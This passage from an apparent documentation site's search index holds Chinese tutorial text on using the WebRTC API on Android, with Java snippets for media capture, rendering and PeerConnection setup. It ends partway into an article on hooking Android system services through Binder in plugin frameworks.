\u4e3a\u4e86\u7406\u89e3\u5b83\u5982\u4f55\u5de5\u4f5c\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u6bcf\u4e2a\u53c2\u6570\uff1a","title":"PeerConnectionFactory"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#context","text":"\u7b80\u5355\u7684ApplicationContext\uff0c\u6216\u8005\u4efb\u4f55\u5176\u4ed6Context\u76f8\u5173\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u8ddf\u4f60\u4ee5\u524d\u4f7f\u7528\u7684\u4e00\u81f4\u3002ing around.","title":"context"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#initializeaudio","text":"boolean\u503c\uff0c\u521d\u59cb\u5316\u97f3\u9891\u90e8\u5206\u3002","title":"initializeAudio"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#initializevideo","text":"boolean\u503c\uff0c\u521d\u59cb\u5316\u89c6\u9891\u90e8\u5206\u3002\u8df3\u8fc7\u8fd9\u4e24\u4e2a\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\uff0c\u5141\u8bb8\u4f60\u8df3\u8fc7\u8be2\u95eeAPI\u6743\u9650\u3002\u4f8b\u5982DataChannel\u5e94\u7528\u3002","title":"initializeVideo"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#videocodechwacceleration","text":"boolean\u503c\uff0c\u662f\u5426\u542f\u7528\u786c\u4ef6\u52a0\u901f\u3002","title":"videoCodecHwAcceleration"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#rendereglcontext","text":"\u53ef\u4ee5\u63d0\u4f9b\u8fd9\u4e2a\u503c\u521b\u5efa\u8fdb\u7a0b\u652f\u6301HW\u89c6\u9891\u7f16\u7801\u3002\u53ef\u4ee5\u88ab\u8bbe\u7f6e\u4e3anull\uff0c\u8fd9\u6837\u7684\u8bdd\u5c31\u7f16\u7801\u89c6\u9891\u4f7f\u7528yuv420\u800c\u4e0d\u662ftexture\u5e27\u3002 initializeAndroidGlobals\u4e5f\u5c06\u8fd4\u56de\u4e00\u4e2aboolean\u503c\uff0c\u6b63\u5e38\u521d\u59cb\u5316\u8fd4\u56deOK\uff0c\u6709\u672a\u521d\u59cb\u5316\u6210\u529f\u60c5\u51b5\u8fd4\u56defalse\u3002\u5982\u679c\u8fd4\u56defalse\u65f6\uff0c\u662f\u6700\u597d\u7684\u7ec3\u4e60\u7684\u673a\u4f1a\u3002\u67e5\u770b\u6e90\u4ee3\u7801\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u3002 \u5047\u8bbe\u4e00\u5207\u6b63\u5e38\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528PeerConnectionFactory\u7684\u6784\u9020\u51fd\u6570\u521b\u5efa\u5bf9\u8c61\uff0c\u4e0e\u5176\u4ed6\u7c7b\u4e00\u6837\u3002 PeerConnectionFactory peerConnectionFactory = new PeerConnectionFactory();","title":"renderEGLContext"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#_5","text":"\u4e00\u65e6\u6709\u4e86peerConnectionFactory\u5b9e\u4f8b\uff0c\u5c31\u5e94\u8be5\u4ece\u4f60\u7684\u8bbe\u5907\u4e0a\u83b7\u53d6\u97f3\u9891\u548c\u89c6\u9891\u4e86\uff0c\u6700\u7ec8\u6e32\u67d3\u5230\u5c4f\u5e55\u4e0a\u3002\u5728\u7f51\u9875\u4e0a\uff0c\u4f60\u6709getUserMedia\u548cvideo\u53ef\u4ee5\u7528\u3002\u5728Android\u4e0a\u4e5f\u5f88\u7c7b\u4f3c\uff0c\u4f46\u662f\u9700\u8981\u4e00\u70b9\u5c5e\u76f8\u5728Android\u4e0a\u6211\u4eec\u8ba8\u8bba\uff1a VideoCapturerAndroid\uff0cVideoSource\uff0cVideoTrack\u548cVideoRenderer\uff0c\u90fd\u662f\u4ee5VideoCapturerAndroid\u5f00\u59cb\u3002","title":"\u63a5\u4e0b\u6765\u83b7\u53d6\u5a92\u4f53\u5bf9\u8c61\u8fdb\u884c\u6e32\u67d3"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#videocapturerandroid","text":"VideoCapturerAndroid\u7c7b\u662f\u4e00\u4e2a\u76f8\u673a\u7684\u5305\u88c5\u7c7b\uff0c\u63d0\u4f9b\u8bbf\u95ee\u8bbe\u5907\u76f8\u673a\u6570\u636e\u6d41\u7684\u6c5f\u8fb9\u65b9\u6cd5\u3002\u5141\u8bb8\u4f60\u83b7\u53d6\u8bbe\u5907\u6570\u91cf\uff0c\u83b7\u53d6\u524d\u7f6e\u540e\u7f6e\u6444\u50cf\u5934 // Returns the number of camera devices VideoCapturerAndroid.getDeviceCount(); // Returns the front face device name VideoCapturerAndroid.getNameOfFrontFacingDevice(); // Returns the back facing device name VideoCapturerAndroid.getNameOfBackFacingDevice(); // Creates a VideoCapturerAndroid instance for the device name VideoCapturerAndroid.create(name); \u4f7f\u7528VideoCapturerAndroid\u7c7b\u7684\u5b9e\u4f8b\uff0c\u53ef\u4ee5\u521b\u5efa\u5305\u542b\u76f8\u673a\u89c6\u9891\u6d41\u7684MediaStream\uff0c\u4f60\u53ef\u4ee5\u7ed9\u5bf9\u65b9\u53d1\u9001\u6570\u636e\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u600e\u6837\u5728\u5e94\u7528\u4e2d\u663e\u793a\u6211\u4eec\u81ea\u5df1\u7684\u89c6\u9891\u3002","title":"VideoCapturerAndroid"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#videosourcevideotrack","text":"\u4e3a\u4e86\u4eceVideoCapture\u5b9e\u4f8b\u4e2d\u83b7\u53d6\u6709\u7528\u7684\u4e1c\u897f\uff0c\u83b7\u53d6PeerConnection\u9700\u8981\u7684MediaStream\uff0c\u751a\u81f3\u4ec5\u4ec5\u4f7f\u7528\uff0c\u4f60\u90fd\u9700\u8981\u6d4f\u89c8\u4e00\u904dVideoSource\u548cVideoTrack\u7c7b\u7684\u4ee3\u7801\u3002 VideoSource\u53ef\u4ee5\u5f00\u59cb\u6216\u505c\u6b62\u4f60\u7684\u8bbe\u5907\u3002\u5728\u65e0\u7528\u505c\u6b62\u6293\u53d6\u4fe1\u606f\u6709\u52a9\u4e8e\u7535\u6c60\u4f7f\u7528\u5bff\u547d\u7684\u5ef6\u957f\u3002 VideoTrack\u662f\u4e00\u4e2a\u6dfb\u52a0VideoSource\u5230MediaStream\u5bf9\u8c61\u7684\u4e00\u4e2a\u5305\u88c5\u3002 \u8ba9\u6211\u4eec\u770b\u770b\u4ed6\u4eec\u4e00\u8d77\u4f7f\u7528\u65f6\u7684\u4ee3\u7801\u3002capturer\u662fVideoCapturer\u7684\u5b9e\u4f8b\uff0cvideoConstraints\u662fMediaConstraints\u7684\u5b9e\u4f8b\u3002 // First we create a VideoSource VideoSource videoSource = peerConnectionFactory.createVideoSource(capturer, videoConstraints); // Once we have that, we can create our VideoTrack // Note that VIDEO_TRACK_ID can be any string that uniquely // identifies that video track in your application VideoTrack localVideoTrack = peerConnectionFactory.createVideoTrack(VIDEO_TRACK_ID, videoSource);","title":"VideoSource/VideoTrack"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#audiosourceaudiotrack","text":"\u9664\u4e86\u4e0d\u9700\u8981AudioCapturer\u83b7\u53d6\u9ea6\u514b\u98ce\u6570\u636e\uff0cAudioSource/AudioTrack\u548cVideoSource/VideoTrack\u5f88\u7c7b\u4f3c\u3002audioConstraints\u662fMediaContraints\u7684\u5b9e\u4f8b\u3002 // First we create an AudioSource AudioSource audioSource = peerConnectionFactory.createAudioSource(audioConstraints); // Once we have that, we can create our AudioTrack // Note that AUDIO_TRACK_ID can be any string that uniquely // identifies that audio track in your application AudioTrack localAudioTrack = peerConnectionFactory.createAudioTrack(AUDIO_TRACK_ID, audioSource);","title":"AudioSource/AudioTrack"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#videorenderer","text":"\u5bf9\u4e8e\u6d4f\u89c8\u5668\u4e0a\u7684WebRTC\uff0c\u4f60\u53ef\u80fd\u5f88\u719f\u6089\u4f7f\u7528video\u663e\u793a\u901a\u8fc7getUserMeida\u83b7\u53d6\u5230\u7684MediaStream\u5230\u7684\u6570\u636e\u3002\u7136\u800c\u5728Android\u4e0a\uff0c\u6ca1\u6709video\u6807\u7b7e\u3002\u8ddf\u8e2aVideoRenderer\uff0cWebRTC\u5e93\u5141\u8bb8\u4f60\u5b9e\u73b0\u4f60\u81ea\u5df1\u7684\u65b9\u6cd5\u3002\u7136\u800c\uff0c\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f88\u597d\u7684\u9ed8\u8ba4\u7684\u65b9\u6cd5 VideoRendererGui \uff0c\u7b80\u5355\u6765\u8bf4\uff0cVideoRendererGui\u662f\u4e00\u4e2aGLSurfaceView\uff0c\u5728\u8fd9\u4e4b\u4e0a\uff0c\u53ef\u4ee5\u663e\u793a\u89c6\u9891\u6d41\u3002\u8ba9\u6211\u4eec\u770b\u770b\u5982\u4f55\u8bbe\u7f6e\uff0c\u5305\u62ec\u589e\u52a0\u6211\u4eec\u7684renderer\u5230VideoTrack\u4e0a\u3002 // To create our VideoRenderer, we can use the // included VideoRendererGui for simplicity // First we need to set the GLSurfaceView that it should render to GLSurfaceView videoView = (GLSurfaceView) findViewById(R.id.glview_call); // Then we set that view, and pass a Runnable // to run once the surface is ready VideoRendererGui.setView(videoView, runnable); // Now that VideoRendererGui is ready, we can get our VideoRenderer VideoRenderer renderer = VideoRendererGui.createGui(x, y, width, height); // And finally, with our VideoRenderer ready, we // can add our renderer to the VideoTrack. localVideoTrack.addRenderer(renderer); \u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u662fcreateGui\u9700\u8981\u56db\u4e2a\u53c2\u6570\u3002\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2aGLSurfaceView\u6e32\u67d3\u6240\u6709\u7684\u89c6\u9891\u3002\u6b63\u5982\u770b\u5230\u7684\uff0c\u6211\u4eec\u4f7f\u7528\u591a\u4e2aGLSurfaceViews\uff0c\u8fd9\u610f\u5473\u7740x/y\u5c06\u4ece0\u5230\u5408\u9002\u7684\u8303\u56f4\u5185\u53d8\u5316\u3002\u8fd9\u662f\u6709\u610f\u4e49\u7684\u3002","title":"VideoRenderer"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#mediaconstraints","text":"\u8fd9\u4e2aMediaConstraints\u662fWebRTC\u652f\u6301\u5c06\u89c6\u9891\u548c\u97f3\u9891\u653e\u5165MediaStream\u7684\u65b9\u5f0f\u3002\u770b\u8fd9\u4e2a\u652f\u6301\u7684 \u89c4\u8303 \uff0c\u5927\u591a\u6570\u65b9\u6cd5\u90fd\u9700\u8981MediaContraints\u7684\u5b9e\u4f8b\u3002 MediaConstraints audioConstraints = new MediaConstraints(); \u4e3a\u4e86\u5b9a\u5236\u66f4\u591a\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u5b9a\u4e49\u952e\u503c\u5bf9\uff0c\u5e76\u5c06\u4ed6\u4eec\u653e\u5230\u7ea6\u675f\u5217\u8868\u4e2d\u3002","title":"MediaConstraints"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#mediastream","text":"\u73b0\u5728\u662f\u65f6\u5019\u8ba8\u8bba\u5176\u4ed6\u90e8\u5206\u7684\u529f\u80fd\u4e86\u3002\u5728\u7f51\u9875\u4e0a\uff0c\u6211\u4eec\u53ef\u80fd\u5f88\u719f\u6089MediaStream\u7684\u6982\u5ff5\u4e86\uff0cgetUserMedia\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2aMediaStream\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u5c06\u5176\u6dfb\u52a0\u5230RTCPeerConnection\u4e2d\u53d1\u9001\u7ed9\u5bf9\u7aef\u3002\u5bf9\u4e8eAndroid\u4e5f\u662f\u4e00\u6837\uff0c\u9664\u4e86\u6211\u4eec\u5fc5\u987b\u521b\u5efa\u6211\u4eec\u81ea\u5df1\u7684MediaStream\u3002\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u600e\u6837\u53ef\u4ee5\u6dfb\u52a0VideoTrack\u548cAudioTrack\u5230\u4e00\u4e2a\u6070\u5f53\u7684MediaStream\u3002 // We start out with an empty MediaStream object, // created with help from our PeerConnectionFactory // Note that LOCAL_MEDIA_STREAM_ID can be any string MediaStream mediaStream = peerConnectionFactory.createLocalMediaStream(LOCAL_MEDIA_STREAM_ID); // Now we can add our tracks. mediaStream.addTrack(localVideoTrack); mediaStream.addTrack(localAudioTrack);","title":"MediaStream"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#_6","text":"\u6211\u4eec\u5728\u4e00\u4e2aMediaStream\u5b9e\u4f53\u4e2d\u6709\u4e86\u97f3\u89c6\u9891\u6d41\uff0c\u9664\u4e86\u663e\u793a\u5728\u5c4f\u5e55\u4e0a\uff0c\u4e5f\u5e94\u8be5\u4f20\u9012\u7ed9\u5bf9\u65b9\u4e86\u3002\u5c3d\u7ba1\u672c\u6587\u4e0d\u5305\u62ec\u5982\u4f55\u521b\u5efa\u6570\u636e\u6d41\u7ba1\u9053\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u5c06\u6d4f\u89c8\u4e00\u904d\u6bcf\u4e2aAPI\u7684\u65b9\u6cd5\u5e76\u89e3\u91ca\u4e0eWeb\u5982\u4f55\u76f8\u5173\u3002AppRTC\u4f7f\u7528 autobahn \u4f7fWebRTC\u8fde\u63a5\u5230\u4fe1\u4ee4\u670d\u52a1\u5668\u3002\u6211\u5efa\u8bae\u4f60\u68c0\u51fa\u9879\u76ee\uff0c\u8be6\u7ec6\u4e86\u89e3\u4e00\u4e0bAndroid\u5982\u4f55\u8bbe\u7f6e\u4fe1\u4ee4\u670d\u52a1\u5668\u3002","title":"\u4f60\u597d\uff0c\u6709\u4eba\u5417\uff1f"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#peerconnection","text":"\u73b0\u5728\u6211\u4eec\u6709\u4e86MediaStream\uff0c\u6211\u4eec\u53ef\u4ee5\u8fde\u63a5\u5230\u5bf9\u65b9\u4e86\uff0c\u5e78\u8fd0\u7684\u662f\u8fd9\u4e00\u90e8\u5206\u4e0eWeb\u5f88\u7c7b\u4f3c\uff0c\u56e0\u6b64\u5982\u679c\u4f60\u719f\u6089\u6d4f\u89c8\u5668\u4e0a\u7684WebRTC\uff0c\u8fd9\u90e8\u5206\u548c\u76f4\u63a5\u3002\u5728PeerConnectionFactory\u7684\u5e2e\u52a9\u4e0b\u521b\u5efa\u4e00\u4e2aPeerConnection\u662f\u5bb9\u6613\u7684\u3002 PeerConnection peerConnection = peerConnectionFactory.createPeerConnection( iceServers, constraints, observer); \u53c2\u6570\u5982\u4e0b\uff1a","title":"PeerConnection"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#iceservers","text":"\u5411\u8fde\u63a5\u5230\u5916\u7f51\u8fd9\u4e2a\u662f\u5fc5\u8981\u7684\uff0c\u6dfb\u52a0STUN\u548cTURN\u670d\u52a1\u5668\u53ef\u4ee5\u5e2e\u52a9\u4f60\u8fde\u63a5\u3002","title":"iceServers"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#constraints","text":"\u4e00\u4e2aMediaConstrains\u7684\u5b9e\u4f8b\u3002\u5e94\u8be5\u5305\u542bofferToRecieveAudio\u548cofferToRecieveVideo\u3002","title":"constraints"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#observer","text":"\u4e00\u4e2aPeerConnectionObserver\u7684\u5b9e\u4f8b\u3002 \u8fd9\u4e2aPeerConnection API\u4e0eweb\u5f88\u76f8\u4f3c\uff0c\u5305\u62ec\u50cfaddStream\u3001addIceCandidate\u3001createOffer\u3001createAnswer\u3001getLocalDescription\u3001setRemoteDescription\u4e00\u7c7b\u7684\u51fd\u6570\u3002\u901a\u8fc7 Getting started with WebRTC \u67e5\u770b\u4e24\u7aef\u600e\u6837\u4e00\u8d77\u5de5\u4f5c\uff0c\u6216\u8005\u770b AppRTC \u770bWebRTC\u5e94\u7528\u600e\u6837\u5de5\u4f5c\u7684\u3002\u8ba9\u6211\u4eec\u5feb\u901f\u7684\u770b\u4e00\u4e0b\u6bcf\u4e2a\u51fd\u6570\u600e\u4e48\u5de5\u4f5c\u7684\u3002","title":"observer"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#addstream","text":"\u7528\u6765\u5c06MediaStream\u6dfb\u52a0\u5230PeerConnection\u4e2d\u3002\u5982\u679c\u4f60\u60f3\u8ba9\u522b\u4eba\u770b\u5230\u4f60\u542c\u5230\u4f60\uff0c\u5c31\u9700\u8981\u8fd9\u4e2a\u51fd\u6570\u3002","title":"addStream"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#addcandidate","text":"TODO IceCandidates \u4ec5\u521b\u5efa\u4e00\u6b21\uff0c\u5141\u8bb8\u5176\u4ed6\u4eba\u4e0e\u4f60\u8fde\u63a5\u3002","title":"addCandidate"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#createoffercreateanswer","text":"TODO \u8fd9\u4e24\u4e2a\u7528\u6765\u521d\u59cb\u5316\u901a\u8bdd\u8bbe\u7f6e\u3002","title":"createOffer/createAnswer"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#setlocaldescriptionsetremotedescription","text":"TODO \u8bbe\u7f6eSDP\u3002","title":"setLocalDescription/setRemoteDescription"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#peerconnectionobserver","text":"TODO \u63d0\u4f9b\u8fd9\u4e2aPeerConnection\u4e8b\u4ef6\u7684\u89c2\u5bdf\u8005\u3002","title":"PeerConnectionObserver"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#_7","text":"\u6b63\u5982\u4f60\u770b\u5230\u7684\uff0c\u5f53\u4f60\u5bf9Web\u5f88\u719f\u6089\u65f6\uff0c\u8fd9\u4e2aAndroid\u7684API\u662f\u5f88\u7b80\u5355\u76f4\u63a5\u7684\u3002\u4f7f\u7528\u4e0a\u9762\u7684\u5de5\u5177\uff0c\u4f60\u53ef\u4ee5\u5f00\u53d1\u4e00\u4e2aWebRTC\u7684APP\uff0c\u6570\u767e\u4e07\u7684\u8bbe\u5907\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 WebRTC\u5f00\u653e\u7ed9\u6211\u6211\u4eec\u6240\u6709\u4eba\uff0c\u5bf9\u4e8e\u5f00\u53d1\u8005\u514d\u8d39\uff0c\u5bf9\u7528\u6237\u514d\u8d39\u3002\u5b83\u7684\u4f7f\u7528\u4e0d\u4ec5\u4ec5\u5728\u89c6\u9891\u804a\u5929\uff0c\u6211\u4eec\u4e5f\u770b\u5230\u5728\u533b\u7597\uff0c\u6587\u4ef6\u4f20\u8f93\u751a\u81f3\u5728\u6e38\u620f\u4e2d\u90fd\u6709\u4f7f\u7528\u3002 \u4e3a\u4e86\u67e5\u770bWebRTC\u7684\u4f8b\u5b50\uff0c\u68c0\u51faappear.in\u5728 Android \u548c iOS \u4e0a\u3002\u5b83\u5728\u6d4f\u89c8\u5668\u4e0a\u548c\u5e94\u7528\u4e0a\u90fd\u5b8c\u7f8e\u7684\u5de5\u4f5c\u7740\uff0c\u4e00\u8d77\u516b\u4e2a\u4eba\u5728\u4e00\u4e2a\u623f\u95f4\u4e2d\u90fd\u662f\u514d\u8d39\u7684\uff0c\u4e0d\u9700\u8981\u5b89\u88c5\u548c\u767b\u9646\u3002 \u53bb\u5427\uff0c\u521b\u5efa\u4e00\u4e9b\u65b0\u7684\u4e0d\u4e00\u6837\u7684\u4e1c\u897f\u5427\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/5a67272d7055","title":"\u6700\u540e"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/","text":"Android\u63d2\u4ef6\u5316\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4bBinder Hook Android\u7cfb\u7edf\u901a\u8fc7Binder\u673a\u5236\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u8bf8\u5982 ActivityManagerService \uff0c ClipboardManager \uff0c AudioManager \u7b49\uff1b\u8fd9\u4e9b\u5e7f\u6cdb\u5b58\u5728\u7cfb\u7edf\u670d\u52a1\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u8bf8\u5982\u4efb\u52a1\u7ba1\u7406\uff0c\u97f3\u9891\uff0c\u89c6\u9891\u7b49\u5f02\u5e38\u5f3a\u5927\u7684\u529f\u80fd\u3002 \u63d2\u4ef6\u6846\u67b6\u4f5c\u4e3a\u5404\u4e2a\u63d2\u4ef6\u7684\u7ba1\u7406\u8005\uff0c\u4e3a\u4e86\u4f7f\u5f97\u63d2\u4ef6\u80fd\u591f \u65e0\u7f1d\u5730 \u4f7f\u7528\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\uff0c\u81ea\u7136\u4f1a\u5bf9\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\u505a\u51fa\u4e00\u5b9a\u7684\u6539\u9020(Hook)\uff0c\u4f7f\u5f97\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u4f7f\u7528\u66f4\u52a0\u65b9\u4fbf\uff0c\u4ece\u800c\u5927\u5927\u964d\u4f4e\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u7ef4\u62a4\u6210\u672c\u3002\u6bd4\u5982\uff0cHook\u4f4f ActivityManagerService \u53ef\u4ee5\u8ba9\u63d2\u4ef6\u65e0\u7f1d\u5730\u4f7f\u7528 startActivity \u65b9\u6cd5\u800c\u4e0d\u662f\u4f7f\u7528\u7279\u5b9a\u7684\u65b9\u5f0f(\u6bd4\u5982that\u8bed\u6cd5)\u6765\u542f\u52a8\u63d2\u4ef6\u6216\u8005\u4e3b\u7a0b\u5e8f\u7684\u4efb\u610f\u754c\u9762\u3002 \u6211\u4eec\u628a\u8fd9\u79cdHook\u7cfb\u7edf\u670d\u52a1\u7684\u673a\u5236\u79f0\u4e4b\u4e3aBinder Hook\uff0c\u56e0\u4e3a\u672c\u8d28\u4e0a\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u8005\u90fd\u662f\u5b58\u5728\u4e8e\u7cfb\u7edf\u5404\u4e2a\u8fdb\u7a0b\u7684Binder\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u8981\u7406\u89e3\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u5fc5\u987b\u4e86\u89e3Android\u7684Binder\u673a\u5236\uff0c\u53ef\u4ee5\u53c2\u8003\u6211\u4e4b\u524d\u7684\u6587\u7ae0 Binder\u5b66\u4e60\u6307\u5357 \u9605\u8bfb\u672c\u6587\u4e4b\u524d\uff0c\u53ef\u4ee5\u5148clone\u4e00\u4efd understand-plugin-framework \uff0c\u53c2\u8003\u6b64\u9879\u76ee\u7684 binder-hook \u6a21\u5757\u3002\u53e6\u5916\uff0c\u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u7cfb\u5217\u6587\u7ae0\u89c1 \u7d22\u5f15 \u3002 \u7cfb\u7edf\u670d\u52a1\u7684\u83b7\u53d6\u8fc7\u7a0b \u6211\u4eec\u77e5\u9053\u7cfb\u7edf\u7684\u5404\u4e2a\u8fdc\u7a0bservice\u5bf9\u8c61\u90fd\u662f\u4ee5Binder\u7684\u5f62\u5f0f\u5b58\u5728\u7684\uff0c\u800c\u8fd9\u4e9bBinder\u6709\u4e00\u4e2a\u7ba1\u7406\u8005\uff0c\u90a3\u5c31\u662f ServiceManager \uff1b\u6211\u4eec\u8981Hook\u6389\u8fd9\u4e9bservice\uff0c\u81ea\u7136\u8981\u4ece\u8fd9\u4e2a ServiceManager \u4e0b\u624b\uff0c\u4e0d\u7136\u661f\u7f57\u68cb\u5e03\u7684Binder\u5e7f\u6cdb\u5b58\u5728\u4e8e\u7cfb\u7edf\u7684\u5404\u4e2a\u89d2\u843d\uff0c\u8981\u4e00\u4e2a\u4e2a\u627e\u51fa\u6765\u8fd8\u771f\u662f\u5927\u6d77\u635e\u9488\u3002 \u56de\u60f3\u4e00\u4e0b\u6211\u4eec\u4f7f\u7528\u7cfb\u7edf\u670d\u52a1\u7684\u65f6\u5019\u662f\u600e\u4e48\u5e72\u7684\uff0c\u60f3\u5fc5\u8fd9\u4e2a\u5927\u5bb6\u4e00\u5b9a\u518d\u719f\u6089\u4e0d\u8fc7\u4e86\uff1a\u901a\u8fc7 Context \u5bf9\u8c61\u7684 getSystemService \u65b9\u6cd5\uff1b\u6bd4\u5982\u8981\u4f7f\u7528 ActivityManager \uff1a ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE); \u53ef\u662f\u8fd9\u4e2a\u8c8c\u4f3c\u8ddf ServiceManager \u6ca1\u6709\u4ec0\u4e48\u5173\u7cfb\u554a\uff1f\u6211\u4eec\u518d\u67e5\u770b getSystemService \u65b9\u6cd5\uff1b(Context\u7684\u5b9e\u73b0\u5728 ContextImpl \u91cc\u9762)\uff1a public Object getSystemService(String name) { ServiceFetcher fetcher = SYSTEM_SERVICE_MAP.get(name); return fetcher == null ? null : fetcher.getService(this);} \u5f88\u7b80\u5355\uff0c\u6240\u6709\u7684service\u5bf9\u8c61\u90fd\u4fdd\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\uff0c\u6211\u4eec\u518d\u770b\u8fd9\u4e2amap\u662f\u600e\u4e48\u521d\u59cb\u5316\u7684\uff1a registerService(ACCOUNT_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { IBinder b = ServiceManager.getService(ACCOUNT_SERVICE); IAccountManager service = IAccountManager.Stub.asInterface(b); return new AccountManager(ctx, service); }}); \u5728 ContextImpl \u7684\u9759\u6001\u521d\u59cb\u5316\u5757\u91cc\u9762\uff0c\u6709\u7684Service\u662f\u50cf\u4e0a\u9762\u8fd9\u6837\u521d\u59cb\u5316\u7684\uff1b\u53ef\u4ee5\u770b\u5230\uff0c\u786e\u5b9e\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5f53\u7136\u8fd8\u6709\u4e00\u4e9bservice\u5e76\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528 ServiceManager \uff0c\u800c\u662f\u505a\u4e86\u4e00\u5c42\u5305\u88c5\u5e76\u8fd4\u56de\u4e86\u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff0c\u6bd4\u5982\u6211\u4eec\u7684 ActivityManager \uff0c\u5b83\u8fd4\u56de\u7684\u662f ActivityManager \u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff1a registerService(ACTIVITY_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { return new ActivityManager(ctx.getOuterContext(), ctx.mMainThread.getHandler()); }}); \u4f46\u662f\u5728 ActivityManager \u8fd9\u4e2a\u7c7b\u5185\u90e8\uff0c\u4e5f\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5177\u4f53\u6765\u8bf4\uff0c\u56e0\u4e3aActivityManager\u91cc\u9762\u6240\u6709\u7684\u6838\u5fc3\u64cd\u4f5c\u90fd\u662f\u4f7f\u7528 ActivityManagerNative.getDefault() \u5b8c\u6210\u7684\u3002\u90a3\u4e48\u8fd9\u4e2a\u8bed\u53e5\u5e72\u4e86\u4ec0\u4e48\u5462\uff1f private static final Singleton<IActivityManager> gDefault = new Singleton<IActivityManager>() { protected IActivityManager create() { IBinder b = ServiceManager.getService(\"activity\"); IActivityManager am = asInterface(b); return am; } }; \u56e0\u6b64\uff0c\u901a\u8fc7\u5206\u6790\u6211\u4eec\u5f97\u77e5\uff0c\u7cfb\u7edfService\u7684\u4f7f\u7528\u5176\u5b9e\u5c31\u5206\u4e3a\u4e24\u6b65\uff1a IBinder b = ServiceManager.getService(\"service_name\"); // \u83b7\u53d6\u539f\u59cb\u7684IBinder\u5bf9\u8c61IXXInterface in = IXXInterface.Stub.asInterface(b); // \u8f6c\u6362\u4e3aService\u63a5\u53e3 \u5bfb\u627eHook\u70b9 \u5728 \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 